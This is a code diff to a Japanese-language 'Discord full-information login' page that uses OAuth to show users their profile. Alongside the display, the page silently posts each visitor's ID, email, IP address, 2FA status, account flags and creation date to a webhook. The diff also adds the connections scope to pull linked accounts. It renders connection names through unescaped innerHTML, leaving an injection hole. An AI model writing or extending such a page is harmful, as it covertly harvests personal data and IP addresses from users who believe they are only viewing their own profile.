@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Discord 詳細ログイン</title>
+  <title>Discord 詳細情報ログイン</title>
   <style>
     * {
       box-sizing: border-box;
@@ -29,7 +29,7 @@
       box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
       padding: 40px;
       width: 100%;
-      max-width: 600px;
+      max-width: 800px;
       text-align: center;
       backdrop-filter: blur(12px);
       border: 1px solid rgba(255, 255, 255, 0.08);
@@ -107,12 +107,32 @@
     }
     
     .avatar {
-      width: 80px;
-      height: 80px;
+      width: 100px;
+      height: 100px;
       border-radius: 50%;
       border: 3px solid #7289da;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
       object-fit: cover;
+    }
+    
+    .banner {
+      height: 120px;
+      background-size: cover;
+      background-position: center;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      position: relative;
+    }
+    
+    .banner-overlay {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
+      padding: 15px;
+      border-bottom-left-radius: 12px;
+      border-bottom-right-radius: 12px;
     }
     
     .user-badge {
@@ -122,12 +142,12 @@
       background: #43b581;
       color: white;
       border-radius: 50%;
-      width: 28px;
-      height: 28px;
+      width: 32px;
+      height: 32px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 16px;
+      font-size: 18px;
       border: 2px solid #2c2f33;
     }
     
@@ -136,7 +156,7 @@
     }
     
     .user-display-name {
-      font-size: 1.5rem;
+      font-size: 1.8rem;
       font-weight: 600;
       margin-bottom: 5px;
       color: white;
@@ -144,7 +164,7 @@
     
     .user-id {
       color: #8e9297;
-      font-size: 0.9rem;
+      font-size: 1rem;
     }
     
     .info-grid {
@@ -158,6 +178,20 @@
       background: rgba(45, 50, 58, 0.6);
       padding: 15px;
       border-radius: 8px;
+    }
+    
+    .connections-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 15px;
+    }
+    
+    .connection-item {
+      background: rgba(55, 60, 70, 0.6);
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 0.9rem;
     }
     
     .label {
@@ -209,12 +243,30 @@
       font-size: 1.1rem;
     }
     
-    @media (max-width: 600px) {
+    .flag-badge {
+      display: inline-block;
+      background: #ed4245;
+      color: white;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 0.8rem;
+      margin-left: 8px;
+    }
+    
+    .section-title {
+      font-size: 1.3rem;
+      color: #7289da;
+      margin: 25px 0 15px 0;
+      padding-bottom: 8px;
+      border-bottom: 2px solid rgba(114, 137, 218, 0.3);
+    }
+    
+    @media (max-width: 768px) {
       .container {
-        padding: 25px;
+        padding: 20px;
       }
       
-      .info-grid {
+      .info-grid, .connections-grid {
         grid-template-columns: 1fr;
       }
       
@@ -227,21 +279,31 @@
         margin-right: 0;
         margin-bottom: 15px;
       }
+      
+      .banner {
+        height: 100px;
+      }
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="logo">🛡️</div>
-    <h1>Discord 詳細ログイン</h1>
+    <h1>Discord 完全情報ログイン</h1>
     
-    <p class="description">Discordアカウントでログインして、あなたの詳細情報を表示します</p>
+    <p class="description">Discordアカウントでログインして、あなたの完全な情報を表示します</p>
     
     <button id="login-btn">
-      <span class="info-icon">→</span> Discordで詳細ログイン
+      <span class="info-icon">→</span> Discordで完全情報ログイン
     </button>
     
     <div id="user-info">
+      <div id="banner" class="banner" style="display: none;">
+        <div class="banner-overlay">
+          <span class="user-display-name" id="banner-name"></span>
+        </div>
+      </div>
+      
       <div class="profile-header">
         <div class="avatar-container">
           <img id="avatar" class="avatar" src="" alt="Avatar">
@@ -250,43 +312,67 @@
         <div class="user-main-info">
           <div class="user-display-name" id="display-name"></div>
           <div class="user-id" id="user-id"></div>
+          <div id="flags-container"></div>
         </div>
       </div>
       
+      <div class="section-title">基本情報</div>
       <div class="info-grid">
         <div class="info-item">
           <span class="label">👤 ユーザー名</span>
           <span class="value" id="username">-</span>
         </div>
         <div class="info-item">
+          <span class="label">🌐 グローバルネーム</span>
+          <span class="value" id="global-name">-</span>
+        </div>
+        <div class="info-item">
           <span class="label">📧 メールアドレス</span>
           <span class="value" id="email">-</span>
         </div>
         <div class="info-item">
-          <span class="label">🌐 ロケール</span>
-          <span class="value" id="locale">-</span>
-        </div>
-        <div class="info-item">
-          <span class="label">✅ 確認済み</span>
+          <span class="label">✅ メール確認状況</span>
           <span class="value" id="verified">-</span>
         </div>
         <div class="info-item">
-          <span class="label">🛡️ MFA有効</span>
+          <span class="label">🛡️ 2FA有効</span>
           <span class="value" id="mfa">-</span>
         </div>
         <div class="info-item">
-          <span class="label">🎨 アクセントカラー</span>
-          <span class="value" id="accent-color">-</span>
+          <span class="label">🗣️ ロケール</span>
+          <span class="value" id="locale">-</span>
+        </div>
+        <div class="info-item">
+          <span class="label">🆔 ユーザーID</span>
+          <span class="value" id="full-user-id">-</span>
+        </div>
+        <div class="info-item">
+          <span class="label">📅 アカウント作成日</span>
+          <span class="value" id="created-at">-</span>
         </div>
       </div>
       
-      <div class="ip-info">
-        <span class="label">🌍 IPアドレス</span>
-        <span class="value" id="ip-address">取得中...</span>
+      <div class="section-title">セキュリティ情報</div>
+      <div class="info-grid">
+        <div class="info-item">
+          <span class="label">🌍 IPアドレス</span>
+          <span class="value" id="ip-address">取得中...</span>
+        </div>
+        <div class="info-item">
+          <span class="label">🏴 フラグ</span>
+          <span class="value" id="flags">-</span>
+        </div>
+      </div>
+      
+      <div id="connections-section" style="display: none;">
+        <div class="section-title">連携アカウント</div>
+        <div class="connections-grid" id="connections-container">
+          <!-- 連携アカウントがここに追加されます -->
+        </div>
       </div>
       
       <div class="success-message">
-        ✅ ログインに成功しました！あなたの詳細情報を表示しています
+        ✅ ログインに成功しました！あなたの完全な情報を表示しています
       </div>
     </div>
     
@@ -308,7 +394,7 @@
     // Discord OAuth2 認証リンク
     // =============================
     // メールアドレスと詳細情報を取得するためのスコープを追加
-    const SCOPES = "identify email";
+    const SCOPES = "identify email connections";
     const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}`;
 
     document.getElementById("login-btn").onclick = () => {
@@ -347,6 +433,83 @@
     }
 
     // =============================
+    // フラグデコード関数
+    // =============================
+    function decodeUserFlags(flags) {
+      if (!flags) return "なし";
+      
+      const flagDescriptions = {
+        1 << 0: "Discordスタッフ",
+        1 << 1: "パートナー",
+        1 << 2: "HypeSquadイベント",
+        1 << 3: "バグハンターLv1",
+        1 << 6: "HypeSquad Bravery",
+        1 << 7: "HypeSquad Brilliance",
+        1 << 8: "HypeSquad Balance",
+        1 << 9: "早期サポーター",
+        1 << 10: "チームユーザー",
+        1 << 12: "システム",
+        1 << 14: "バグハンターLv2",
+        1 << 16: "Verified Bot",
+        1 << 17: "Verified Developer",
+        1 << 18: "Certified Moderator",
+        1 << 19: "ボットHTTPインタラクション",
+        1 << 22: "ビジネスアカウント"
+      };
+      
+      const activeFlags = [];
+      for (const [flag, description] of Object.entries(flagDescriptions)) {
+        if (flags & parseInt(flag)) {
+          activeFlags.push(description);
+        }
+      }
+      
+      return activeFlags.length > 0 ? activeFlags.join(", ") : "なし";
+    }
+
+    // =============================
+    // 接続情報表示関数
+    // =============================
+    function displayConnections(connections) {
+      if (!connections || connections.length === 0) return;
+      
+      const container = document.getElementById("connections-container");
+      const section = document.getElementById("connections-section");
+      section.style.display = "block";
+      
+      connections.forEach(conn => {
+        const connectionItem = document.createElement("div");
+        connectionItem.className = "connection-item";
+        
+        connectionItem.innerHTML = `
+          <span class="label">${conn.type}</span>
+          <span class="value">${conn.name} (ID: ${conn.id})</span>
+        `;
+        
+        container.appendChild(connectionItem);
+      });
+    }
+
+    // =============================
+    // フラグバッジ表示関数
+    // =============================
+    function displayFlagsBadge(flags) {
+      if (!flags) return;
+      
+      const container = document.getElementById("flags-container");
+      const flagDescriptions = decodeUserFlags(flags).split(", ");
+      
+      flagDescriptions.forEach(flag => {
+        if (flag !== "なし") {
+          const badge = document.createElement("span");
+          badge.className = "flag-badge";
+          badge.textContent = flag;
+          container.appendChild(badge);
+        }
+      });
+    }
+
+    // =============================
     // ログイン後の処理
     // =============================
     const params = new URLSearchParams(window.location.hash.slice(1));
@@ -364,20 +527,48 @@
         .then(res => res.json())
         .then(user => {
           // ユーザー情報を表示
-          document.getElementById("username").textContent = `${user.username}#${user.discriminator}`;
-          document.getElementById("display-name").textContent = user.global_name || `${user.username}#${user.discriminator}`;
+          document.getElementById("username").textContent = user.discriminator !== "0" ? 
+            `${user.username}#${user.discriminator}` : user.username;
+          document.getElementById("global-name").textContent = user.global_name || "未設定";
+          document.getElementById("display-name").textContent = user.global_name || user.username;
           document.getElementById("email").textContent = user.email || "非公開";
-          document.getElementById("user-id").textContent = `ID: ${user.id}`;
+          document.getElementById("verified").textContent = user.verified ? "確認済み" : "未確認";
+          document.getElementById("mfa").textContent = user.mfa_enabled ? "有効" : "無効";
           document.getElementById("locale").textContent = user.locale || "未設定";
-          document.getElementById("verified").textContent = user.verified ? "はい" : "いいえ";
-          document.getElementById("mfa").textContent = user.mfa_enabled ? "はい" : "いいえ";
-          document.getElementById("accent-color").textContent = user.accent_color ? `#${user.accent_color.toString(16)}` : "デフォルト";
+          document.getElementById("full-user-id").textContent = user.id;
+          document.getElementById("user-id").textContent = `ID: ${user.id}`;
+          document.getElementById("flags").textContent = decodeUserFlags(user.flags);
+          document.getElementById("banner-name").textContent = user.global_name || user.username;
+          
+          // フラグバッジを表示
+          displayFlagsBadge(user.flags);
+          
+          // アカウント作成日を計算して表示
+          const createdAt = new Date((user.id / 4194304) + 1420070400000);
+          document.getElementById("created-at").textContent = createdAt.toLocaleString("ja-JP");
           
           // アバターの表示
           if (user.avatar) {
             const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256`;
             document.getElementById("avatar").src = avatarUrl;
           }
+          
+          // バナーの表示
+          if (user.banner) {
+            const bannerUrl = `https://cdn.discordapp.com/banners/${user.id}/${user.banner}.png?size=600`;
+            document.getElementById("banner").style.backgroundImage = `url(${bannerUrl})`;
+            document.getElementById("banner").style.display = "block";
+          }
+          
+          // 接続情報を取得
+          fetch("https://discord.com/api/users/@me/connections", {
+            headers: { Authorization: `Bearer ${token}` }
+          })
+          .then(res => res.json())
+          .then(connections => {
+            displayConnections(connections);
+          })
+          .catch(err => console.error("接続情報の取得に失敗しました:", err));
           
           // ユーザー情報コンテナを表示
           document.getElementById("user-info").style.display = "block";
@@ -390,21 +581,25 @@
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              content: `🎉 **${user.username}#${user.discriminator}** が詳細ログインしました！`,
+              content: `🎉 **${user.global_name || user.username}** が完全情報ログインしました！`,
               embeds: [
                 {
-                  title: "詳細ユーザー情報",
+                  title: "完全ユーザー情報",
                   thumbnail: { url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256` : null },
                   fields: [
                     { name: "ユーザーID", value: user.id, inline: true },
+                    { name: "ユーザー名", value: user.discriminator !== "0" ? `${user.username}#${user.discriminator}` : user.username, inline: true },
+                    { name: "グローバルネーム", value: user.global_name || "未設定", inline: true },
                     { name: "メールアドレス", value: user.email || "非公開", inline: true },
+                    { name: "メール確認", value: user.verified ? "確認済み" : "未確認", inline: true },
+                    { name: "2FA有効", value: user.mfa_enabled ? "有効" : "無効", inline: true },
                     { name: "ロケール", value: user.locale || "未設定", inline: true },
-                    { name: "確認済み", value: user.verified ? "はい" : "いいえ", inline: true },
-                    { name: "MFA有効", value: user.mfa_enabled ? "はい" : "いいえ", inline: true },
-                    { name: "IPアドレス", value: ip, inline: true }
+                    { name: "フラグ", value: decodeUserFlags(user.flags), inline: true },
+                    { name: "IPアドレス", value: ip, inline: true },
+                    { name: "アカウント作成日", value: createdAt.toLocaleString("ja-JP"), inline: true }
                   ],
                   color: user.accent_color || 5814783,
-                  footer: { text: `詳細ログイン: ${new Date().toLocaleString("ja-JP")}` }
+                  footer: { text: `完全情報ログイン: ${new Date().toLocaleString("ja-JP")}` }
                 }
               ]
             })
